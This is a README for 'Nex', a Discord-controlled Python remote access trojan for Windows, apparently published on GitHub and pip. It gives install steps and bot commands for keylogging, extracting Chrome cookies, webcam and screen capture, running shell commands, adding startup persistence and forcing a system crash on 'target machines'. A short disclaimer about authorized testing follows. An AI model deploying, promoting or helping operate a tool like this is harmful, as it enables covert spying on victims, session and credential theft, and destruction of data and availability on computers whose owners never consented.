# Nex

Nex is a powerful Remote Administration Tool (RAT) built with Python. It allows you to manage Windows machines remotely through a Discord bot interface. With Nex, you can execute commands, capture screens, control webcams, manage files, and much more.

**⚠️ WARNING**  
This project is inspired by [Pinkcord](https://github.com/Jvr2022/pinkcord). This repository is an updated version of Pinkcord with additional features and improvements.

---

## Features

Nex offers a wide range of remote administration functionalities:

- **Remote command execution**: Run system commands on the target machine.  
- **File management**: Copy, delete, upload, and move files.  
- **Keylogging**: Record keystrokes for monitoring purposes.  
- **Screenshots and screen recording**: Capture one-time screenshots or record the screen in real-time.  
- **Webcam capture**: Take snapshots using the target machine's webcam.  
- **Clipboard access**: Read the content of the clipboard.  
- **Volume control**: Increase or decrease system volume.  
- **Wi-Fi control**: Turn Wi-Fi on or off.  
- **Startup program management**: Add programs to run on system startup.  
- **Wallpaper changes**: Change the desktop wallpaper.  
- **Process management**: List running processes and kill tasks.  
- **Blue Screen of Death (BSOD) trigger**: Force a system crash.  
- **Session management**: Each machine has a unique session ID for tracking.  
- **Chrome cookie extraction**: Access saved browser cookies.  

---

## Installation

`pip install NexWorld`

`import NexWorld as nex`

`nex.start("BOT_TOKEN")`

**Notes about the setup file:**  
- The setup file fully works on **both Windows and Linux**.  
- However, the RAT itself is currently **Windows-only**. Linux support for the RAT is under development and will be added in a future update.

Once the bot is online, type `!h` in Discord to see all available commands.

---

## Usage Notes

- Each machine has a **unique session ID**, so reconnecting does not change the session.  
- To run commands on **all sessions**, replace the session ID with `all`.  
- Some actions may require administrative privileges on the target machine.  
- Use responsibly: this tool should only be used in authorized penetration testing or educational environments.

---

## Example Commands

Here are some example commands you can use with Nex:  

- `!ss <session> <monitor>`: Take a screenshot of a specific monitor.  
- `!screenrecord <session> start/stop [monitor]`: Start or stop screen recording.  
- `!camera <session>`: Take a snapshot from the webcam.  
- `!keylogger <session> start/stop/log`: Control the keylogger.  
- `!shell <session> yes/no <command>`: Execute a system command.  
- `!wifi <session> on/off`: Enable or disable Wi-Fi.  
- `!shutdown <session>`: Shut down the target system.  
- `!restart <session>`: Restart the target system.  
- `!chrome <session> cookie`: Extract Chrome cookies.  
- `!processes <session>`: List all running processes.  
- `!kill <session> <task>`: Kill a specific process.

For the full command list, type `!h` in Discord once the bot is online.

---

## Disclaimer

Nex is intended **for educational purposes and authorized penetration testing only**. Using it on machines without permission is illegal and can result in serious consequences.  

The author is **not responsible** for any misuse of this software. By using Nex, you agree to only deploy it in environments where you have explicit permission.

---

## Development Notes

- The Linux version of the RAT is **currently under development**.  
- The setup script works on Linux, but the RAT's full functionality is **Windows-only for now**.  
- Future updates will add Linux support for features such as screenshots, file management, and shell execution.